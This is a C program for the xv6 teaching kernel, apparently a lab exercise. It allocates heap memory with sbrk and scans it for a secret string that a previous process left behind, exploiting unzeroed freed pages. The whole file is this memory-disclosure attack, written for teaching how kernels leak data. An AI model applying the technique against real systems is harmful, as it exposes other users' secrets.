#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#define DATASIZE (32 * PGSIZE)

int
main(int argc, char *argv[])
{
  char *data = sbrk(DATASIZE);
  if (data == (char *)-1) {
    printf("attack sbrk failed\n");
    exit(1);
  }
  char *msg = "Here it is: ";
  int msg_len = strlen(msg);
  for (int i = 0; i <= DATASIZE - msg_len; i++) {
    if (memcmp(data + i, msg, msg_len) == 0) {
      char *secret = data + i + msg_len;
      int remaining = DATASIZE - (i + msg_len);
      int len = 0;
      while (len < remaining && secret[len] != '\0') {
        len++;
      }
      if (len > 0 && len < remaining) {
        printf("%s\n", secret);
        exit(0);
      }
    }
  }
  printf("attack: secret not found\n");
  exit(1);
}
